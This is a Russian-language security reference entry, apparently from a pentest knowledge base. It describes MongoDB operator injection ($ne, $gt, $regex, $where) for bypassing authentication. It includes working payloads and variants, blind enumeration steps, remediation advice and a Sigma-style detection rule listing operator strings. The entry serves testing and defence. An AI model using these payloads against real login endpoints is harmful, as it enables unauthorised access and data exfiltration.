---
id: nosql-mongodb-operator-injection
title: "MongoDB: инъекция операторов ($ne/$gt/$regex) в JSON-запрос"
type: nosql
target: mongodb
category: web
difficulty: intermediate
bypass: none
tags: [nosql, mongodb, operator-injection, auth-bypass]
tested_on: ["MongoDB 4.4", "MongoDB 6.0", "express + mongoose"]
success_rate: 0.8
risk: high
cwe: "CWE-943"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/NoSQL_Injection"
  - "https://portswigger.net/web-security/all-topics"
graph:
  - target: "nosql"
    type: instance_of
  - target: "auth-bypass"
    type: leads_to
  - target: "data-exfiltration"
    type: leads_to
---

# MongoDB: инъекция операторов ($ne/$gt/$regex) в JSON-запрос

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
{"username": {"$ne": null}, "password": {"$ne": null}}
```

## Explanation

MongoDB принимает в качестве значения запроса не только скаляр, но и **объект операторов**.
Если приложение кладёт пользовательский JSON прямо в фильтр
(`db.users.findOne({username: body.username, password: body.password})`),
то `$ne: null` делает условие истинным для любого документа, где поле существует.
Результат — вход без пароля или обход фильтрации.

Тот же механизм работает, когда параметры приходят из query-строки в Express:
`?username[$ne]=x&password[$ne]=y` парсится `qs`/`body-parser` в объект
`{username: {$ne: 'x'}}` — то есть SQL-подобной кавычки не нужно вовсе.
Опасные операторы: `$ne`, `$gt`, `$gte`, `$lt`, `$regex`, `$where`, `$expr`,
`$function` (MongoDB ≥ 4.4, может выполнять JS на сервере).

## Detection

1. Отправьте JSON-тело с `{"$ne": null}` вместо строки — изменился ли ответ?
2. Для query-параметров: `?user[$ne]=1`, `?user[$gt]=`, `?user[$regex]=^a`.
3. Признаки MongoDB в ошибках: `MongoServerError`, `unknown operator`,
   `$where expression`, BSON-артефакты в ответах.
4. Слепая проверка: `{$regex: '^a'}` против `{$regex: '^z'}` — различие
   в числе результатов подтверждает инъекцию (посимвольный перебор).
Инструменты: `nosqli`, Burp-расширения NoSQL, `tplmap`-подобные сканеры.

## Remediation

- Валидация типа: принимать только строку/число, отклонять объекты и массивы
  (`typeof value !== 'string' -> 400`); в Express — `express.json` с схемой
  (joi/zod/ajv) и запрет `qs`-параметров с квадратными скобками.
- Не передавать пользовательские данные в фильтр напрямую: собирать фильтр
  из whitelist-полей.
- Отключить `$where`/`$function` на уровне сервера, если не используются
  (`--noscripting`, `security.javascriptEnabled: false`).
- Принцип минимальных прав для учётки приложения; отдельная роль на чтение.
- Логировать запросы с операторами в значениях полей.

## Variants

```
{"username": "admin", "password": {"$gt": ""}}
```

```
?username[$ne]=toto&password[$ne]=toto
```

```
{"$where": "sleep(5000)"}
```

```
{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}
```

## Detection rules

```yaml
title: NoSQL-инъекция — операторы MongoDB в пользовательских данных
id: e5f6a7b8-0074-4e5f-9a7b-000000000074
status: experimental
description: >-
  В теле JSON или в query-параметрах (user[$ne]=1) встречаются операторы
  MongoDB: $ne, $gt, $nin, $exists, $where. Классический эффект — обход
  аутентификации и перечисление документов.
references:
  - https://attack.mitre.org/techniques/T1190/
  - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
logsource:
  category: application
  definition: 'логи приложения с телом запроса + access-лог с query-строкой'
detection:
  selection_body:
    request_body|contains:
      - '$ne'
      - '$gt'
      - '$nin'
      - '$exists'
      - '$where'
  selection_query:
    cs-uri-query|contains:
      - '[$ne]'
      - '[$gt]'
      - '[$regex]'
      - '[$exists]'
      - '%24ne'
      - '%24gt'
      - '%24where'
  condition: selection_body or selection_query
fields:
  - source_ip
  - request_path
  - request_body
  - cs-uri-query
falsepositives:
  - приложения, легитимно принимающие Mongo-операторы от доверенных клиентов
    (админки, BI) — исключайте по source_ip/request_path
level: high
tags:
  - attack.initial_access
  - attack.t1190
  - cwe.943
```
